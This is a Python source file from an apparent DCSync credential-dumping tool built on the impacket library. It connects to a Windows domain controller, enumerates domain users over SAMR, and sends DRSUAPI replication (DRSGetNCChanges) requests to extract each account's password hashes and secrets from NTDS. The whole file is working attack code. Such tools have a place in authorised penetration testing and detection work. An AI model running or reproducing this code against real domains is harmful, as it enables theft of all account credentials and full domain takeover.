
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, DCERPC_v5, DCERPCException
from impacket.dcerpc.v5 import epm, drsuapi, transport, samr
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.dcerpc.v5.dtypes import NULL
from impacket.uuid import string_to_bin
from impacket import system_errors
from typing import Tuple, List

from DCSync.structures.NTDS import NTDSPrincipalSecrets, NTDSDCSyncHashes, NTDSHashes
from DCSync.structures.Credentials import Credentials
from DCSync.structures.Target import Target
from DCSync.core.Logger import Logger

class RPC:

    credentials: Credentials
    target: Target
    logger: Logger

    def __init__(self, credentials: Credentials, target: Target, logger: Logger) -> None:
        self.credentials  = credentials
        self.target       = target
        self.logger       = logger

    def getRPCTransport(self, uuidAPI) -> DCERPC_v5:
        stringBinding = epm.hept_map(self.target.remote, uuidAPI, protocol="ncacn_ip_tcp")
        self.logger.debug(f"StringBinding {stringBinding}")

        rpcTransport = transport.DCERPCTransportFactory(stringBinding)
        rpcTransport.setRemoteHost(self.target.remote)
        rpcTransport.setRemoteName(self.target.remote)

        rpcTransport.set_credentials(
            username=self.credentials.username,
            password=self.credentials.password,
            domain=self.credentials.domain,
            lmhash=self.credentials.lmhash,
            nthash=self.credentials.nthash,
            aesKey=self.credentials.aesKey
        )

        rpcTransport.set_kerberos(self.credentials.doKerberos, self.target.remote)

        dcerpc = rpcTransport.get_dce_rpc()
    
        dcerpc.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        if self.credentials.doKerberos:
            dcerpc.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        
        dcerpc.connect()
        dcerpc.bind(uuidAPI)

        return dcerpc

class SAMR(RPC):

    def getAllUsers(self) -> list:
        """
        Use SAMR to enumerate principals
        <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/d7b62596-4a46-4556-92dc-3aba6d517907>
        """
        rpcSamr = self.getRPCTransport(samr.MSRPC_UUID_SAMR)

        # Setup Connection
        try:
            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/1076eb2a-4f51-4c5a-a7c7-a78323b06198
            respSamrConnect2 = samr.hSamrConnect2(rpcSamr)
        except Exception:
            self.logger.error("Can't enumerate users thought SAMR, maybe you are not admin and the Windows Version is >10")
            return list()
        
        serverHandle = respSamrConnect2["ServerHandle"]

        if respSamrConnect2["ErrorCode"] != 0:
            self.logger.error("Connect error")
            return list()

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/2142fd2d-0854-42c1-a9fb-2fe964e381ce
        respSamrEnumerateDomainsInSamServer = samr.hSamrEnumerateDomainsInSamServer(
            rpcSamr,
            serverHandle=serverHandle,
            enumerationContext=0,
            preferedMaximumLength=500,
        )
        if respSamrEnumerateDomainsInSamServer["ErrorCode"] != 0:
            self.logger("Connect error")
            return list()

        domain_name = respSamrEnumerateDomainsInSamServer["Buffer"]["Buffer"][0]["Name"]
        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/47492d59-e095-4398-b03e-8a062b989123
        respSamrLookupDomainInSamServer = samr.hSamrLookupDomainInSamServer(
            rpcSamr,
            serverHandle=serverHandle,
            name=domain_name,
        )
        if respSamrLookupDomainInSamServer["ErrorCode"] != 0:
            self.logger.error("Connect error")
            return list()

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/ba710c90-5b12-42f8-9e5a-d4aacc1329fa
        respSamrOpenDomain = samr.hSamrOpenDomain(
            rpcSamr,
            serverHandle=serverHandle,
            desiredAccess=samr.MAXIMUM_ALLOWED,
            domainId=respSamrLookupDomainInSamServer["DomainId"],
        )
        if respSamrOpenDomain["ErrorCode"] != 0:
            self.logger.error("Connect error")
            return list()

        domains = respSamrEnumerateDomainsInSamServer["Buffer"]["Buffer"]
        domain_handle = respSamrOpenDomain["DomainHandle"]
        # End Setup

        status = STATUS_MORE_ENTRIES
        enumerationContext = 0
        while status == STATUS_MORE_ENTRIES:
            try:
                # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6bdc92c0-c692-4ffb-9de7-65858b68da75
                enumerate_users_resp = samr.hSamrEnumerateUsersInDomain(rpcSamr, domain_handle, enumerationContext=enumerationContext)
            except DCERPCException as e:
                if str(e).find("STATUS_MORE_ENTRIES") < 0:
                    self.logger.error("Error enumerating domain user(s)")
                    break
                enumerate_users_resp = e.get_packet()

            rids = [r["RelativeId"] for r in enumerate_users_resp["Buffer"]["Buffer"]]
            self.logger.debug(f"Full domain RIDs retrieved: {rids}")
            users = self.__getUserInfo(rpcSamr, domain_handle, rids)

            # set these for the while loop
            enumerationContext = enumerate_users_resp["EnumerationContext"]
            status = enumerate_users_resp["ErrorCode"]

        rpcSamr.disconnect()
        
        return users

    def __getUserInfo(self, dce, domain_handle, user_ids) -> list:
        self.logger.debug(f"Getting user info for users: {user_ids}")
        users = list()

        for user in user_ids:
            self.logger.debug(f"Calling hSamrOpenUser for RID {user}")

            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/0aee1c31-ec40-4633-bb56-0cf8429093c0
            open_user_resp = samr.hSamrOpenUser(
                dce,
                domain_handle,
                samr.MAXIMUM_ALLOWED,
                user
            )

            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/29ab27f6-61da-4c7d-863c-e228ee798f4d
            info_user_resp = samr.hSamrQueryInformationUser2(
                dce,
                open_user_resp["UserHandle"],
                samr.USER_INFORMATION_CLASS.UserAllInformation
            )["Buffer"]

            user_info = info_user_resp["All"]
            user_name = user_info["UserName"]

            users.append(user_name)
            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/55d134df-e257-48ad-8afa-cb2ca45cd3cc
            samr.hSamrCloseHandle(dce, open_user_resp["UserHandle"])

        return users

class DRSUAPI(RPC):

    def dRSNCChanges(self, users: set) -> List[NTDSPrincipalSecrets]:
        """
        Using DRSUAPI to sync principals secrets
        <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/58f33216-d9f1-43bf-a183-87e3c899c410>
        """
        self.principalsSecrets = list()

        rpcDrsuapi = self.getRPCTransport(drsuapi.MSRPC_UUID_DRSUAPI)

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/605b1ea1-9cdc-428f-ab7a-70120e020a3d
        requestDrsBind, drs = self.__buildDRSBind()
        respDrsBind = rpcDrsuapi.request(requestDrsBind)

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/668abdc8-1db7-4104-9dea-feab05ff1736
        hDrs = self.__getDRSBindContextHandle(rpcDrsuapi, respDrsBind, requestDrsBind, drs)

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        respControllerInfo = drsuapi.hDRSDomainControllerInfo(rpcDrsuapi, hDrs, self.credentials.domain, 2)

        if respControllerInfo["pmsgOut"]["V2"]["cItems"] > 0:
            NtdsDsaObjectGuid = respControllerInfo["pmsgOut"]["V2"]["rItems"][0]["NtdsDsaObjectGuid"]
        else:
            self.logger.error(f"Couldn't get DC info for domain {self.credentials.domain}")
            return

        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/9b4bfb44-6656-4404-bcc8-dc88111658b3
        respDrsCrackNames = drsuapi.hDRSCrackNames(
            rpcDrsuapi,
            hDrs,
            0,
            drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN,
            drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
            users
        )

        if respDrsCrackNames["pmsgOut"]["V1"]["pResult"]["cItems"] != len(users):
            self.logger.error(f"Some users are not found!")

        for index, item in enumerate(respDrsCrackNames["pmsgOut"]["V1"]["pResult"]["rItems"]):
            if item["status"] != 0:
                error = system_errors.ERROR_MESSAGES[
                    0x2114 + item["status"]
                ]
                self.logger.error(f"{users[index]} - {error[0]}: {error[1]}")
                continue

            # Unique user ID
            userGuid = item["pName"][:-1]

            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894
            request = self.__buildDRSNCChanges(userGuid, hDrs, NtdsDsaObjectGuid)
            try:
                respDrsNCChanges = rpcDrsuapi.request(request)
            except Exception:
                self.logger.error("You either don't have DS-Replication-Get-Changes / DS-Replication-Get-Changes-All rights or you are not admin!")
                return

            replyVersion = "V%d" % respDrsNCChanges["pdwOutVersion"]
            self.principalsSecrets.append(
                NTDSDCSyncHashes.getPrincipalSecrets(rpcDrsuapi, respDrsNCChanges, respDrsNCChanges["pmsgOut"][replyVersion]["PrefixTableSrc"]["pPrefixEntry"])
            )
            
        rpcDrsuapi.disconnect()

        return self.principalsSecrets

    def __buildDRSBind(self) -> Tuple[drsuapi.DRSBind, drsuapi.DRS_EXTENSIONS_INT]:
        request = drsuapi.DRSBind()
        request["puuidClientDsa"] = drsuapi.NTDSAPI_CLIENT_GUID

        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs["cb"] = len(drs)
        drs["dwFlags"] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | \
                            drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs["SiteObjGuid"] = drsuapi.NULLGUID
        drs["Pid"] = 0
        drs["dwReplEpoch"] = 0
        drs["dwFlagsExt"] = 0
        drs["ConfigObjGUID"] = drsuapi.NULLGUID
        drs["dwExtCaps"] = 0xffffffff

        request["pextClient"]["cb"] = len(drs)
        request["pextClient"]["rgb"] = list(drs.getData())

        return (request, drs, )
    
    def __getDRSBindContextHandle(self, drsr: DCERPC_v5, resp, request: drsuapi.DRSBind, drs: drsuapi.DRS_EXTENSIONS_INT) -> bytes:
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        ppextServer = b"".join(resp["ppextServer"]["rgb"]) + b"\x00" * (
            len(drsuapi.DRS_EXTENSIONS_INT()) - resp["ppextServer"]["cb"]
        )
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt["dwReplEpoch"] != 0:
            # Different epoch, we have to call DRSBind again
            drs["dwReplEpoch"] = drsExtensionsInt["dwReplEpoch"]
            request["pextClient"]["cb"] = len(drs)
            request["pextClient"]["rgb"] = list(drs.getData())
            resp = drsr.request(request)

        return resp["phDrs"]
    
    def __buildDRSNCChanges(self, userGuid: str, hDrs: bytes, NtdsDsaObjectGuid) -> drsuapi.DRSGetNCChanges:
        dsName = drsuapi.DSNAME()
        dsName["SidLen"] = 0
        # Remove '{' and '}'
        dsName["Guid"] = string_to_bin(userGuid[1:-1])
        dsName["Sid"] = ""
        dsName["NameLen"] = 0
        dsName["StringName"] = ("\x00")
        dsName["structLen"] = len(dsName.getData())

        request = drsuapi.DRSGetNCChanges()
        request["hDrs"] = hDrs
        request["dwInVersion"] = 8

        request["pmsgIn"]["tag"] = 8
        request["pmsgIn"]["V8"]["uuidDsaObjDest"] = NtdsDsaObjectGuid
        request["pmsgIn"]["V8"]["uuidInvocIdSrc"] = NtdsDsaObjectGuid

        request["pmsgIn"]["V8"]["pNC"] = dsName

        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
        request["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0

        request["pmsgIn"]["V8"]["pUpToDateVecDest"] = NULL

        request["pmsgIn"]["V8"]["ulFlags"] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request["pmsgIn"]["V8"]["cMaxObjects"] = 1
        request["pmsgIn"]["V8"]["cMaxBytes"] = 0
        request["pmsgIn"]["V8"]["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ

        ppartialAttrSet = None

        if ppartialAttrSet is None:
            prefixTable = []
            ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            ppartialAttrSet["dwVersion"] = 1
            ppartialAttrSet["cAttrs"] = len(NTDSHashes.ATTRTYP_TO_ATTID)
            for attId in list(NTDSHashes.ATTRTYP_TO_ATTID.values()):
                ppartialAttrSet["rgPartialAttr"].append(drsuapi.MakeAttid(prefixTable , attId))

        request["pmsgIn"]["V8"]["pPartialAttrSet"] = ppartialAttrSet
        request["pmsgIn"]["V8"]["PrefixTableDest"]["PrefixCount"] = len(prefixTable)
        request["pmsgIn"]["V8"]["PrefixTableDest"]["pPrefixEntry"] = prefixTable
        request["pmsgIn"]["V8"]["pPartialAttrSetEx1"] = NULL

        return request
